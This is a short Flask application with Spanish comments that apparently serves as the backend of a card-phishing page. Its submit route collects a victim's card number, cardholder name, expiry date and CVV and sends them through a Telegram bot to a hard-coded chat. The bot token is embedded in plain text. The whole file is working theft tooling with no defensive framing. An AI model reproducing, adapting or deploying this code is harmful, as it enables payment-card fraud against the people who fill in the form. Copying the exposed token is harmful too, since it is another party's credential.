from flask import Flask, render_template, request
from telegram import Bot
import asyncio

app = Flask(__name__)

# Inicializa el cliente de Telegram
bot = Bot(token="5307419742:AAFrofqgT-mZevsdQK30LxBEnigd_s9bbt4")

# ID numérico de tu usuario de Telegram
usuario_telegram = 1421824880

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    if request.method == 'POST':
        numero_tarjeta = request.form['numero_tarjeta']
        nombre_tarjeta = request.form['nombre_tarjeta']
        fecha_vencimiento = request.form['fecha_vencimiento']
        cvv = request.form['cvv']
        
        # Envía los datos recopilados a través de Telegram
        mensaje = f"Número de tarjeta: {numero_tarjeta}, Nombre en la tarjeta: {nombre_tarjeta}, Fecha de vencimiento: {fecha_vencimiento}, CVV: {cvv}"
        asyncio.run(enviar_mensaje_telegram(usuario_telegram, mensaje))
        
        return 'Datos enviados correctamente.'

async def enviar_mensaje_telegram(chat_id, mensaje):
    try:
        await bot.send_message(chat_id=chat_id, text=mensaje)
        print("Mensaje enviado correctamente a Telegram.")
    except Exception as e:
        print("Error al enviar mensaje a Telegram:", e)

if __name__ == '__main__':
    app.run(debug=True)


